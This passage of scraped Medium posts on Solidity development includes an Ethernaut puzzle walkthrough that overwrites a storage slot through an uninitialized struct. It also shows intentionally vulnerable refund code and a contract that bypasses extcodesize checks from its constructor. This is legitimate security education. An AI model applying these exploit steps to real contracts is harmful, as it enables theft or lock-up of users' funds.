and confusing options.LOW: No mechanism to prevent functions from being overridden.LOW: Invalid UTF-8 sequences are allowed in comments.LOW: It is not possible to declare constant variables inside functions.LOW: Base fallback function cannot be extended.LOW: No mechanism to ensure abstract contracts.LOW: Low coverage for optimization-specific end-to-end tests.LOW: Erroneous mutability detection when dead code is involved.LOW: Misleading error message on overload resolution failure.LOW: Misleading error when externally referencing a state variable.LOW: Misleading error when internally calling an external function.LOW: Fuzzer.cpp and solfuzzer have counterintuitive naming.LOW: AFL example from the documentation doesn\u2019t work.LOW: Fuzz testing scheduling and visibilityLOW: Crash when requested type is not present.LOW: Crash when accessing empty name variable slot.LOW: Crash when type not set for parameter return value.LOW: Crash when type not set for parameter function value.LOW: Crash when accessing a _slot of a function in assembly block.LOW: Crash when calling a non callable type on a non primitive type double assignment.LOW: Crash when using assembly jump instruction inside a constructor or function with same name as contract.LOW: Crash when declaring external function with array of struct that possesses arrays.LOW: Crash when using struct as external function parameter using ABIEncoderV2.LOW: Crash when converting fixed point type using ABIEncoderV2.LOW: Crash when array index value is too large.LOW: High CPU usage on conversion between numeric literal and others.LOW: High CPU usage when using large variable names.NotesNOTE: Non-functional requirements.NOTE: Micropayment Channel example is not written.NOTE: Consider reviewing the language design process and adding high-level goals.NOTE: Tests hang if cpp-ethereum is not in $PATH.NOTE: The help string for the \u2014 libraries option is wrong.NOTE: The deprecated var keyword is documented.NOTE: Deprecated constructors found in examples.NOTE: Warnings for unassigned arrays are not truncated.\u200b\u200b\u200bConclusionsTwo critical severity and ten high severity issues were found and explained, along with recommendations on how to fix them. Some additional changes were proposed to follow best practices and reduce potential attack surface.Update: All critical and high severity issues were fixed or addressed by the Solidity team.If you are interested in smart contract security, you can continue the discussion in our forum, follow us on Medium, or even better, join the team\ud83d\ude80. If you are buidling a project of your own and would like to request a security audit, please do so here.Note that as of the date of publishing, the above review reflects the current understanding of known security patterns as they relate to the Solidity compiler. We have not reviewed the Augur project. The above should not be construed as investment advice or an offering of tokens. For general information about smart contract security, check out our thoughts here.", "responses": 0, "tags": ["Ethereum", "Solidity", "Compilers", "Audit", "Security"]}, {"title": "Blockwatch: Tools for Working With Solidity", "post_link": "https://medium.com/hackernoon/blockwatch-tools-for-working-with-solidity-fc2620de559f?source=search_post", "author_name": "Chris Chinchilla", "author_link": "https://medium.com/@ChrisChinchilla", "publish_date": "2017-12-04", "last_modified_date": "2018-05-24", "readtime": "3.03", "claps": 90, "voters": 15, "content": "Blockwatch: Tools for Working With SolidityChris ChinchillaFollowDec 4, 2017 \u00b7 4 min readRecently a group of Blockchain enthusiasts at the co-working space I occasionally work from decided that it was time we stopped talking about Blockchain and actually learned how to create something based on it.We wanted to create a coin or token for the community to use internally, and whilst the project has stalled for now, I started investigating Ethereum in more depth, and the language it uses for creating smart contracts, Solidity. I will cover the language itself in more detail in the future (when I understand it more myself!), but in this post, I will cover some of the tools available for working with the language.Your Language of ChoiceYour starting point is the official Ethereum clients, available for all operating systems and in Go, C++, Rust, and Python. All support the full breadth of classes and methods for Solidity and many of the other tools listed here will need them as dependencies.There is an unofficial client for JavaScript. The repository I linked to is out of date, but it contains a useful reference to where to now find the libraries you need.RemixMix promised to be a fully-fledged Solidity IDE, but it never materialized and Remix is its the web-based alternative. You can lint, compile, debug, run, and analyze your Solidity code based on different versions of the Ethereum compiler. You can also run your own local copy of Remix in the browser, or as a browser extension.WalletsThe official Ethereum wallet and mist applications allow you to deploy contracts to networks, but not much else, so you should make sure your code is finished before using them.JetBrains IDEsIf you use any of the IDEs based on the IntelliJ platform, then there\u2019s a plugin available that supports formatting, snippets, and code completion.Eclipse IDEPapyrus is a UML modeling environment for the Eclipse IDE (and the Oxygen XML editor), and uml2solidity is a plugin for Papyrus that lets you convert UML models to Solidity. For experienced programmers who are new to smart contracts, this is a great way to model your ideas in languages that are familiar to you.AtomI am a big Atom fan, so I was delighted to find a selection of packages available with Solidity support.There\u2019s the Solidity linter based on coding standards from the solc npm package, and the solium linter based on the solium project. They take different approaches to configuration, linter-solidity has far more users, and I couldn\u2019t even get linter-solium to work, so that may make deciding between the two an easy choice. And finally, there\u2019s autocomplete for Solidity and language-ethereum that adds support for Solidity and Serpent, another language you can use for creating smart contracts.The etheratom package lets you compile and deploy Solidity code from the editor, but it\u2019s complicated to setup and you have to know what you\u2019re doing as it requires several Ethereum related tools to already be installed, and working, on your machine.Deployment FrameworksYou know when the development community has started to accept a language when it starts creating frameworks for it. Unsurprisingly Ethereum has a couple of options.Truffle claims to be the most popular option, supporting compilation, testing, deployment, and dependency management.Embark is similar, and also offers integration with IPFS for storage-based solutions and whisper or orbit for communications-based applications.Dapp is a simpler CLI tool for package management, testing, and deployment of smart contracts.For more enterprise-like projects, BlockApps offers a full-stack platform for creating private blockchain applications that promise to fit into any of your existing toolchains.An Ecosystem of Constant ChangeThe blockchain space is in constant flux and thus a list of tools will not be comprehensive for the foreseeable future. If there\u2019s anything missing from this list, please add it to the comments below.Originally published at dzone.com.", "responses": 0, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts"]}, {"title": "How to Build a Dividend Token With Solidity", "post_link": "https://medium.com/crowdbotics/how-to-build-a-dividend-token-with-solidity-81ae3bf3fe72?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-11-14", "last_modified_date": "2019-06-13", "readtime": "4.27", "claps": 53, "voters": 15, "content": "How to Build a Dividend Token With SolidityTroubleshooting common challenges such as rounding errors, sending duplicate dividends, gas optimization, unfixed total supply, and more.Gaurav AgrawalFollowNov 14, 2018 \u00b7 5 min readRecap: In the previous tutorials we build a burnable token, we also learned and build a capped token, and make that token time sensitive. To learn more, check out our previous tutorials. In this tutorial, we will build a dividend token.Prerequisite:Understanding of basic concepts of solidityUnderstanding of ERC20 standardWhat is dividend token?A dividend is the distribution of reward from a portion of company\u2019s earnings and is paid to a class of its shareholders. So a token which pays out profits to its investor as dividends is a dividend token. There are multiple ways to pay the dividend in the token economy. Today we will discuss how to build this feature into a smart contract.Why use dividend Token?Dividends are standard practice to distribute earnings to investors. Dividends also create a passive income source for your investors. This will attract long-term investors and create incentives for holding tokens.Problems we tackle in our Dividend token contractWe will tackle below main problems which we usually face while building a dividend token.Rounding error problem \u2014 When we work with multiple account transfers and divide dividends, there can be a case where we lose tokens while dividing for investors. This will be solved using a bigger multiplier so we don\u2019t get fraction values.Getting a dividend multiple times\u2014 We also need to take care that someone can\u2019t get a dividend more than one time. This case can happen when Bob gets the dividend on his tokens, then transfer tokens to another account and gets dividends again. This will be solved updating dividends for sender and receivers before any transfer.Gas optimization \u2014 There are multiple ways to update dividends for investors, one way is to write a loop and update dividends to investors account but this design has a problem to run out of gas. We can optimize it by using a different design introduced by Nick Johnson.Unfixed Total Supply \u2014 We will also create a token where total supply is not fixed and get increased when dividends get paid.DividendToken.solOur code:SourceNow let's breakdown our dividend Token code.    string public name = \"Dividend Token\";    string public symbol = \"DIV\";    uint8 public decimals = 0;      uint256 public totalSupply_ = 1000000;    uint256 totalDividendPoints = 0;    uint256 unclaimedDividends = 0;    uint256 pointMultiplier = 1000000000000000000;    address owner;        struct account{         uint256 balance;         uint256 lastDividendPoints;    }    mapping(address => account) public balanceOf;name \u2014 Name of our tokesymbol \u2014 Our token symboldecimal \u2014 We are using 0 decimal for simplicitytotalSupply_ \u2014 Total supply of our tokentotalDividentPoints \u2014 Total dividend which is given till nowunclaimedDividends \u2014 Track unclaimed dividends.pointMultiplier \u2014 10\u00b9\u2078 as point multiplier to tackle rounding errorsowner \u2014 Owner address of our smart contractaccount \u2014 Structure using to track balance and dividendsbalanceOf \u2014 Mapping for address and account(above structure) to track accounts.Dividend LogicNow let's dive into our main dividend logic.modifier updateDividend(address investor) {    uint256 owing = dividendsOwing(investor);    if(owing > 0) {        unclaimedDividends = unclaimedDividends.sub(owing);        balanceOf[investor].balance =             balanceOf[investor].balance.add(owing);        balanceOf[investor].lastDividendPoints =  totalDividendPoints;        }     _;    }function dividendsOwing(address investor) internal returns(uint256){       uint256 newDividendPoints = totalDividendPoints.sub(balanceOf[investor].lastDividendPoints);        return (balanceOf[investor].balance.mul(newDividendPoints)).div(pointMultiplier); }function disburse(uint256 amount) onlyOwner public {    totalDividendPoints = totalDividendPoints.add((amount.mul(pointMultiplier)).div(totalSupply_));    totalSupply_ = totalSupply_.add(amount);    unclaimedDividends =  unclaimedDividends.add(amount); }updateDividend \u2014 This will calculate dividends owed by an account. It will call dividendsOwing method, which we will see in a minute. After finding out what dividends owe to an account, we will update our unclaimedDividends variable and then we will update investor\u2019s account balance and lastDividendPoints.We will use this modifier with every transfer method for both sender and receiver.dividendsOwing \u2014 This function has our main logic to calculate dividends. it will calculate dividends using the following logic.new dividend = totalDividendPoints - investor's lastDividnedPoint investor's dividend = ( investor's balance * new dividend ) / points multiplierYou can see we are calculating dividends based on investor\u2019s balance. This function will only be called by the contract owner.disburse \u2014 This function will be called to pay dividends to the contract which will increase totalDividendPoints , totalSupply_ and unclaimedDividends. We are using pointmultiplier (10\u00b9\u2078) to steer clear of a rounding error.totalDividendPoints += (amount * pointMultiplier ) / totalSupply_The Basic Formula for the dividend for an investor according to his/her balance is-investor's dividend = Total Dividend / investor\u2019s balanceOther parts of the contract are implementing with standard ERC20 methods. Which we will not discuss in this tutorial.Testing Dividend ContractNow let\u2019s write a test case where we will see if above is working properly.it('dividend Test' , async() => {   await this.tokenInstance.transfer(web3.eth.accounts[1],100000, {from : web3.eth.accounts[0]});  await this.tokenInstance.disburse(100000);  await this.tokenInstance.transfer(web3.eth.accounts[2],100000, {from : web3.eth.accounts[1]});  const investor_1_balance = await this.tokenInstance.balanceOf(web3.eth.accounts[1]);  const investor_2_balance = await this.tokenInstance.balanceOf(web3.eth.accounts[2]);  const totalSupply = await this.tokenInstance.totalSupply_();  assert.equal( totalSupply, 1100000);  assert.equal(investor_1_balance, 10000);  assert.equal(investor_2_balance, 100000);  })Below are the steps which are getting performed by the test case.investor_0 \u2192 100000 tokens \u2192 investor_1100000 tokens were given as dividends to the contractinvestor_1 \u2192 100000 tokens \u2192 investor_2investor_1 balance should be 10000 tokens (This is the dividend amount because the account has 100000 tokens when the dividend was given)investor_2 balance should be 100000 tokens (account should not have dividends tokens because there were no tokens when the dividend was given)Total supply should increase to 1100000 (after getting 100000 tokens as a dividend)ConclusionSo, today we created a dividend token. We learned how to tackle a rounding error problem and a multiple dividend problem. There are multiple ways to create dividends for your investors in the token economy. Proof of stake protocol also has similar properties, which we will discuss in future.Notes & suggestions-Do not use this code in production, this code is for educational purpose. If you don\u2019t understand something or want to learn something else let us know in comments. You can view full code in my GitHub repository.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 0, "tags": ["Ethereum", "Solidity", "Blockchain Technology", "Web Development", "Ethereum Development"]}, {"title": "Solidity\u2019s biggest bug: Javascript", "post_link": "https://medium.com/@karl_dot_tech/soliditys-biggest-bug-javascript-be5c4f3520a5?source=search_post", "author_name": "Karl Floersch", "author_link": "https://medium.com/@karl_dot_tech", "publish_date": "2016-04-25", "last_modified_date": "2018-04-26", "readtime": "2.92", "claps": 61, "voters": 19, "content": "Solidity\u2019s biggest bug: JavascriptKarl FloerschFollowApr 25, 2016 \u00b7 3 min readReliance on Javascript is stunting the growth of the Solidity development ecosystem. It\u2019s why new developers get stuck. It\u2019s why we struggle integrating Solidity into development environments. And it\u2019s why much of our documentation is out of date. We are stuck in our Javascript mindstate because we don\u2019t treat Solidity like it\u2019s a real language.This begins with how we teach Solidity to new developers. First, we explain Bitcoin, Ethereum, blockchain, and smart contracts. Next we show them the SimpleStorage smart contract. It all makes sense until we start adding Javascript into the mix. We begin explaining web3 and how to make your SimpleStorage GUI.What happened? Are we trying to teach smart contract development or how to build GUIs? Imagine trying to learn Solidity as your first programming language, and then getting told you have to know Javascript too. That would give me nightmares.Solidity is constantly treated as a second class language.This is not just a problem for newbies. Seasoned developers spend weeks on-boarding before they write a single smart contract. Instead of learning Solidity, they spend their time debugging web3 issues.Personally, I spent over a month trying to integrate Ethereum development tools with my React/webpack frontend enviornment. Project after project I kept hitting walls that I didn\u2019t quite understand. That is, until I realized I had just spent weeks on my tooling with no smart contracts to show for it (talk about Javascript tool fatigue). Trying to couple my Solidity development enviornment to my Javascript frontend caused me nothing but pain.Coupling our Javascript and Solidity environments also causes documentation problems. Most of our \u201cSolidity\u201d tutorials don\u2019t actually cover language features. Instead they focus on Javascript integration tools which are in constant flux. We document high level abstractions instead of core functionality. It\u2019s like living in a world where Angular.js is documented better than Javascript.Because flashy GUIs provide great press, and CLIs only get Vim-users excited, Ethereum devs have been focusing on frontends. It\u2019s natural then that we tack-on smart contracts to our Javascript frontend workflows. We just throw the .sol files into a /contracts directory and call it a day. But this strategy doesn\u2019t scale. For dapps to move out of the prototype phase we will need mature tools which reduce the complexity of large smart contract systems.There\u2019s still hopeWe can still fix this. We need to treat Solidity like a real language and develop tools for Solidity developers not just for the Javascript developer dabbling in Solidity. There are a few areas which require the most attention:Solidity Learning Resources: More comprehensive learning resources that focus on Solidity. This could include a Hello World app that prints \u2018Hello World\u2019 to the console using events. Having tutorials that cover Solidity basics, up to advanced design patterns will do wonders for our community.Solidity Package Manager: Smart contracts on Ethereum all execute within a shared runtime. This provides great opportunities for code reuse, but somehow we still don\u2019t have a good package manager. npm empowered the Javascript community to share and reuse code. The Solidity development ecosystem needs it\u2019s equivalent.Solidity Unit Testing: It\u2019s common practice to test contracts with Javascript testing libraries. This practice introduces implicit dependencies (e.g. RPC connectivity), requires context switching, and is difficult for non-Javascript developers. Instead, for reliable unit tests, we need powerful Solidity unit testing frameworks. We need the Chai and Mocha for Solidity.Solidity development is wonderfully greenfield and I haven\u2019t covered most of what needs to be built. But that\u2019s what makes this field so exciting. Every developer can make a huge impact. But for us to make the most impact, we need to stop building around the problem and attack it at it\u2019s heart: the Solidity language.Our ecosystem is already maturing. But it would progress much faster if we stopped using Javascript as a crutch. We would soften the learning curve, empower developers, and push our ecosystem forward. Just because Solidity is resource constrained, doesn\u2019t mean it should be treated as a second class language. If the Ethereum computer is going to change the world, it will need the most vibrant developer ecosystem supporting it.Let\u2019s drop Javascript reliance like semicolons and take Solidity to the next level.Originally published at karl.tech on April 25, 2016.", "responses": 4, "tags": ["JavaScript", "Ethereum"]}, {"title": "Ethernaut Lvl 17 Locked Walkthrough: How to properly use (and abuse) structs in Solidity", "post_link": "https://medium.com/coinmonks/ethernaut-lvl-17-locked-walkthrough-how-to-properly-use-structs-in-solidity-f9900c8843e2?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-09-17", "last_modified_date": "2018-09-20", "readtime": "3.29", "claps": 80, "voters": 13, "content": "Ethernaut Lvl 17 Locked Walkthrough: How to properly use (and abuse) structs in SolidityThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources and key concepts you\u2019ll need to solve the puzzles 100% on your own.Nicole ZhuFollowSep 17, 2018 \u00b7 4 min readThis levels requires you to unlock a registrar by abusing a poorly initiated struct.Best practices when using StructsLike in object oriented programming, you can create composite datatypes via structs.Structs can contain functions and other complex datatypes like mappings and arrays. These arrays and mappings can even contain more structs. However, structs cannot directly contain other structs (unless they are values in mappings or arrays).Let\u2019s step through what to do and what not to do when working with structs:How to initialize a structHere\u2019s an example from Solidity docs on how to declare structs:struct Funder {    address addr;    uint amount;}struct StructOfStructs {    ...    mapping (uint => Funder) funders;}There are various syntaxes for initializing a struct.You can directly pass values into the struct object:... = Funder(msg.sender, msg.value);2. Or, you can use object notation to pass values into the struct object, for better readability:... = Funder({addr: msg.sender, amount: msg.value})Common usage patterns (memory vs storage)You can have single, globally declared struct objects in your contract, but that defeats the purpose for creating a new datatype.More commonly, you\u2019ll use an array or a mapping to save a collection of structs. For example, let\u2019s create an array of Funders and a mapping of Funders.An array of Funders:Funders[] public funders;function ... {    Funder memory f;    f.address = ...;    f.amount = ...;    funders.push(f);}Important to know: Struct declarations default to storage. You should always use a memory modifier when creating or copying structs. It is not recommended to use structs for any temporary computations inside functions.A mapping of Funders:mapping (uint => Funder) funders; function ... {    funders[index] = Funder(...);}Important to know: when you directly save a memory struct into a state variable, the memory struct is automatically forced into storage.The following are examples of what NOT to do when creating a new struct.Bad example 1You should not declare a new storage struct in your function, as it will overwrite other globally stored variables. This is important to keep in mind to pass this Ethernaut level.// Do NOT do thisfunction badFunction{    Funder f;         //this defaults to storage    f.address = ...;    f.amount = ...;    funders.push(f);  //this will fail}Bad example 2You cannot implicitly convert memory into storage. The following will throw a compilation error:// Do NOT do thisfunction badFunction{    Funder storage f = Funder(...);}// Do NOT do thisfunction badFunction(Funder _funder){    Funder storage f = _funder;}Notice that function input parameters are also memory, not storage reference pointers.Detailed WalkthroughThis level requires you to change the unlocked global variable in Locked.sol from false to true.Notice that the contract stores unlocked in its first storage slot. The next item is a bytes32 name so you know unlocked occupies the entire first slot. The bytecode for false is 0x00, so unlocked looks like this in the contract\u2019s storage slot:0x0000000000000000000000000000000000000000000000000000000000000000Notice that this level commits a big no-no when implementing a struct inside the public register() function:function register(_name...){    NameRecord newRecord;     //storage declaration    newRecord.name = _name;    newRecord.mappedAddress = _mappedAddress;...newRecord defaults to storage! And any data saved inside newRecord will overwrite the existing slots 1 and 2 in storage.Conveniently, unlocked is currently stored in slot 1. Let\u2019s override unlocked by passing a true bool, masquerading as the _name variable, via the public register function.Convert true into a bytes32 variable:0x00000000000000000000000000000000000000000000000000000000000000012. In Remix, invoke register with your bytes32 true and an arbitrary contract address. Remember to add quotes around your values as per Remix requirements.3. Ignore the Metamask warning message and allocate extra gas.4. Double check that your 0x01 value has overridden unlocked to be true. In console, check that the following is now true:await contract.unlocked();Key Security TakeawaysStruct declarations default to storage. You should always use a memory modifier when creating or copying structs inside functions. Do not use structs for in-function computations.You should not declare a new storage struct in your function, as it will overwrite other globally stored variables.Learn more about structsCheck out Solidity Koans (inspired by Ruby Koans) and practice using structs in Solidity by making tests pass!More LevelsEthernaut Lvl 16 Preservation Walkthrough: How to inject malicious contracts with delegatecallThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources\u2026medium.comEthernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)It's a common flub for Solidity developers to lose a newly created contract address. This becomes frustrating\u2026medium.com", "responses": 0, "tags": ["Programming", "Ethereum", "Blockchain Development", "Smart Contracts", "Tutorial"]}, {"title": "Minimal Solidity Contract Testing with Ganache and Jest", "post_link": "https://medium.com/hackernoon/minimal-solidity-contract-testing-with-ganache-and-jest-f735547d9643?source=search_post", "author_name": "Adrian Li", "author_link": "https://medium.com/@adrianmcli", "publish_date": "2018-12-31", "last_modified_date": "2019-01-07", "readtime": "3.50", "claps": 205, "voters": 13, "content": "Minimal Solidity Contract Testing with Ganache and JestAdrian LiFollowDec 31, 2018 \u00b7 4 min readRecently, while writing some frontend tooling for dapps (stay tuned), I encountered the need to quickly test that my library would work with real Solidity contracts.While I always recommend dapp makers to start with a Truffle project, sometimes you need something a little more lightweight. For example, instead of having to run migrations, maybe you just want to compile a smart contract and test right-away.No worries, the Truffle suite of tools has got you covered!In this tutorial, I will show you how to setup minimal smart contract testing with Ganache and Jest.If you don\u2019t need a step-by-step explanation, the example repo is right here:adrianmcli/ganache-jest-example\ud83d\ude80 Minimal Solidity contract testing with Ganache and Jest - adrianmcli/ganache-jest-examplegithub.comJust three stepsIn essence, there are only three things you need to do:Compile the Solidity contractSpawn a test \u201cblockchain\u201dDeploy the contract.Sounds daunting right? But thanks to Truffle and the community at large, this is actually all a lot simpler than you might think.Our ContractBefore we get started, let\u2019s create our contract, SimpleStorage.sol:This contract is very simple, it allows you to get and set an integer, that\u2019s it.Compiling the contractWe\u2019re going to be using solc-js to compile our Solidity contract. This means we will have to conform to their way of doing things and this might get a little funky so let\u2019s create a new file for that.Start a new file called compile.js and paste in the following:We are exporting a function compile that will take in a filename and look for it in the same folder. We pass solc the options object (i.e. input) in the way that it wants and it spits out a JSON that we can extract our artifact from.Do note that I also have a version of the repo using truffle-compile instead of solc. There are pros and cons to either one, feel free to make your own judgement call.Spawning a test blockchain with GanacheFor this part and the next, I\u2019ll be explaining the concepts first and then I\u2019ll show you the whole file where it all comes together. So please pay attention, I promise it\u2019ll pay off!Spawning a test blockchain is way simpler than I could have ever hoped for. Literally the only thing you need to do is:// import Ganacheconst Ganache = require(\"ganache-core\");// spawn the test \"blockchain\" providerconst provider = Ganache.provider();// use it like how you would normally use a providerconst web3 = new Web3(provider);const accounts = await web3.eth.getAccounts();The one-liner Ganache.provider() essentially does all the heavy lifting for you. It basically spawns a blockchain in-memory and gives you the provider object to interact with it.From the provider, we can easily get theweb3 instance and subsequently the accounts array that we will need in the next step.Deploy your contractNow that we have web3 as well as the contract artifact, we can deploy it onto our test blockchain.const instance = new web3.eth.Contract(SimpleStorage.abi);const deployedInstance = await instance.deploy({  data: SimpleStorage.evm.bytecode.object}).send({  from: accounts[0],  gas: 150000});This is standard usage of the Web3.js API (v1.0). We first create our contract instance by passing in the ABI from our artifact SimpleStorage.abi. And then we deploy it by calling .deploy() with the bytecode from our contract artifact, and finally send() from our account with a specified gas amount to make sure it goes through.Putting it all togetherNow that we understand what we need to do, we can make a new file called test.js and start writing our test. Most of what we talked about is setting up the environment for our tests, so it will go under the beforeAll() hook from Jest.At this point, I am going to show you the entirety of this file:Note that the provider, web3, accounts, andcontractInstance variables are declared outside of the beforeAll() hook so that we can use those them in our tests.We also have an afterAll() hook where we call stop() on the provider to prevent memory leaks.Finally, the actual example test demonstrates setting and getting a value.Some thoughtsOf course, this might get a little un-wieldy if you have many different contracts and they inherit from each other. For those use-cases, I would highly recommend a traditional Truffle project.However, if you have something simple to test, or if you want to test out your frontend separately from your Truffle project, this is a great option that allows you to do so.Do keep in mind that spawning a Ganache provider does take a couple seconds, so try not to do it all-over the place. If you start having to do that, it may be another sign that you should consider converting your project to a full-on Truffle project instead.This format may not be for everyone, so do check out the example repo that you can clone and run for yourself!adrianmcli/ganache-jest-example\ud83d\ude80 Minimal Solidity contract testing with Ganache and Jest - adrianmcli/ganache-jest-examplegithub.comIf you liked this article, please give me a few claps!", "responses": 0, "tags": ["Ethereum", "Solidity", "Dapps", "Ethereum Blockchain", "Blockchain"]}, {"title": "The Solidity Withdrawal Pattern", "post_link": "https://blog.b9lab.com/the-solidity-withdrawal-pattern-1602cb32f1a5?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2019-03-26", "last_modified_date": "2019-04-15", "readtime": "8.29", "claps": 165, "voters": 12, "content": "The Solidity Withdrawal PatternRob HitchensFollowMar 26 \u00b7 9 min readWatch out for stranger danger.Ethereum protocol assures us that transactions are atomic. That is, they either succeed completely or they don\u2019t do anything (important) at all. Sounds great, right?One of the more challenging aspects of adapting to this environment is internalizing non-obvious risks. We need to learn about new kinds of danger and form habits that will help us avoid trouble.This post will reveal various ways that naive assumptions can get a contract into trouble and show you how vulnerable contracts can be interfered with. The author will suggest some habits you can form to protect yourself.Let us consider a naive contract. Let\u2019s just consider a situation where funds need to be distributed to more than one account. It could be an air drop, a dividend or something else. Let\u2019s say everyone has contributed to a crowd funding project but the funding goal wasn\u2019t reached and now everyone should get their money back.The Naive Wayfunction sendRefunds() public onlyOwner returns(bool success) {    for (i=0; i<funders.length; i++) {        funders[i].transfer(contributionAmount);     }    return true;}Great. For every funder, return the contribution (Let\u2019s just say the amount of the contribution was the same for everyone). Only the owner is allowed to make that happen.I set most application details aside so we can focus on what is wrong with this approach to a seemingly simple task.Serious ProblemsThe serious problems aren\u2019t obvious.On a deep design level, I would argue that the contract doesn\u2019t assure anyone they will get their money back. Only the owner can initiate the function, but they are distraught, possibly in hiding, possibly irresponsible, possibly have lost the only signing key that can make it happen. The owner is a single point of failure and this pattern suggests adherence to server-centric thinking \u2014 only a privileged user should be able to initiate a mass distribution of funds.Such thinking misses the point of a distributed system and the assurances that are possible with a smart contract. If the people are entitled to a refund, then there should be no possibility of interference in that process.Another error is the unbounded for loop. It will surely run out of gas at some maximum number of funders making it impossible for anyone to recover the funds. That is not good. It\u2019s an anti-pattern. If the foregoing claim sounds mysterious or inadequately-explained, see Getting Loopy with Solidity. Suffice it to say that an attacker who wishes sabotage the refund process would merely need to send a large number of trivially small contributions such that cost of executing the loop exceeds the block gas limit.A more subtle problemSuppose Alice and Bob are the two funders and for some reason the campaign is limited to two funders. Further suppose that the developer is a purist and wants to avoid using a loop. The function could be re-imagined in a more idiomatic fashion:function sendRefunds() public onlyOwner returns(bool success) {    alice.transfer(amount);    bob.transfer(amount);    return true;}What could go wrong, right? There is no conditional logic. We know transactions are atomic. There are three simple steps to complete. Can you imagine a scenario where no one gets paid (other than the owners not playing ball as mentioned)? Take your time. The next bullet is a spoiler.What would happen if Bob rejected the transfer? Think about it. Take your time.Would Alice get paid? Would the transaction succeed or fail? Take your time.Spoiler alertIf Bob rejects the transfer, the transfer method reverts and this causes the entire transaction to fail, meaning the sender (signer, owner) gets an error. The transaction is atomic. It\u2019s an all-or-nothing proposition, right? So, if any participant rejects the transfer then no participant gets paid. Said another way, if one fails then they all fail.Why would that happen? An intuitive way to look at this is to assume that all accounts want and accept all funds at all times because receiving money is always desirable. That\u2019s naive. That would be making assumptions about what the participants find desirable. If they find it more desirable to interfere with the refund process and the contract allows it, then we can expect that to happen.How?Fallback functions are not payableContracts have fallback functions that run when such transfers are received. By default they look roughly like:function () public {}Notably, the default fallback is not payable, so it will reject all funds. It\u2019s good practice for contracts to reject all unexpected funds. Contracts usually have accounting needs to attend to and they don\u2019t want these \u201cout of the blue\u201d transfers. By default, a contract will reject the transfer. This is deadly for the naive contract if it happens to accept funds from a contract. It can\u2019t work unless everyone cooperates. By extension, it can\u2019t work if even one funder is a contract with the default setup.If trouble can happen by accident, trouble can happen on purposeThe possibility of an accident also means there is a possibility of a denial-of-service attack. An attacker might send a small contribution to a fund-raiser, take its place among the funders and DoS the refund process. That\u2019s trivially simple (and possibly very cheap) sabotage. An attacker could tie up considerable funds and cause reputational damage to the project team. The situation probably wouldn\u2019t be repairable. Indeed, a determined attacker could jam up the refund, effectively holding the funds hostage, possibly for ransom. Yikes!Maybe we should disallow contractsI feel some questionable ideas are worth mentioning. One might look at this and think \u201cAh, Ha! All I need to do is prohibit contracts from participating.\u201d In my view this idea defeats the idea of reliable modular code that interacts to form more complex systems. Why should you want your contract to discriminate on this basis? Is there no valid case where the client (msg.sender) is a contract? What about autonomous organizations? What about multi-signature wallets?One might see this looks promising: https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contractAlas, there is a catch. If an attacker calls the contract from a constructor this method will return false (not a contract) because the caller has no bytecode, yet. It has no bytecode yet because the constructor hasn\u2019t reached that step, yet. This, and the even cheaper extcodehashmethod, doesn\u2019t reliably identify contracts so is not a recommended practice.The idea is simple enough:pragma solidity 0.4.25;contract Victim {    contract Victim {    // this is the example code that \"detects\" a contract.      function isContract() public view returns(bool){        uint32 size;        address a = msg.sender;        assembly {            size := extcodesize(a)        }        return (size > 0);    }}contract Attacker {        bool public iTrickedIt;    Victim v;    // the detection method doesn't work in the case of constructor        constructor(address _v) public {        v = Victim(_v);        // address(this) doesn't have code, yet        iTrickedIt = !v.isContract();    }}You can play around with that in Remix.Deploy a VictimDeploy an Attacker with the Victim addressCheck iTrickedItTrue!It was fooled into thinking the Attacker is not a contract. So, rather than preventing interactions with contracts, this effort to avoid contracts simply instructs attackers to launch their attacks from constructors. Perhaps even worse, attackers will know we are concerned about interacting with contracts, and that transmits a strong hint about where to look for a vulnerability.Stranger danger!Maybe we should check the sendOne could dispense with the transfer method and use send instead. It returns a false instead of revert in the case that the value transmission fails. You get something like this:function sendRefund() public onlyOwner returns(bool success) {    if(!alice.send(amount)) {        // now deal with the failure case    }}What exactly are we supposed to do? If Alice won\u2019t accept the funds, then we have some messy accounting to deal with. If we are interested in thoroughness and fairness, then we have to give Alice a way to withdraw those funds.Withdrawal functionWe can make a function for funders to come and claim their funds. This works equally well for externally owned accounts and contracts. It has the added benefit that the beneficiary of the transaction pays for the gas.Our job is to know how much money is owed. Let\u2019s set some details aside for a moment and just look at the basic idea. In this context, msg.sender is the account asking for their funds. We will check if the request is acceptable and then proceed.function claimRefund() public {    require(balance[msg.sender] > 0);    msg.sender.transfer(balance[msg.sender]);}Never talk to more than one untrusted contract at a timeNotice that the claimRefund() function snippet is only concerned with the msg.sender, that is, who is asking for money right now? Is the request acceptable? Does the contract owe them funds? If so, do it.It doesn\u2019t rely on the owner doing what the funders expect them to do. The contract relies on its own logic, which is the logic of the agreement. There is no need for the owner to confirm what is already apparent to all observers.It doesn\u2019t rely on the other parties not interfering. No one aside from the msg.senderabout which each transaction is concerned is involved in the logic.Those are good safety habits. By compartmentalizing interactions with one untrusted party at a time, we make it very hard for users to interfere with others. This approach resolves the central issues we discovered in the naive contract.Unlimited interactions with trusted contracts. One untrusted contract at a timeYou can create vast systems of trusted contracts that talk to each other, and that\u2019s okay when you use access control to ensure that the msg.senderis something trustworthy. In this context trusted means there is no doubt about its intentions, what it does or how it works. In the examples, msg.sender could be anyone or anything, so we don\u2019t trust it. One of those \u201cuntrusted\u201d parties at a time. That\u2019s our budget.We can\u2019t safely open another channel of communication with another \u201cuntrusted\u201d contract within a single transaction. While it may be difficult to reason about precisely how a potential attack might unfold, talking to more than one untrusted 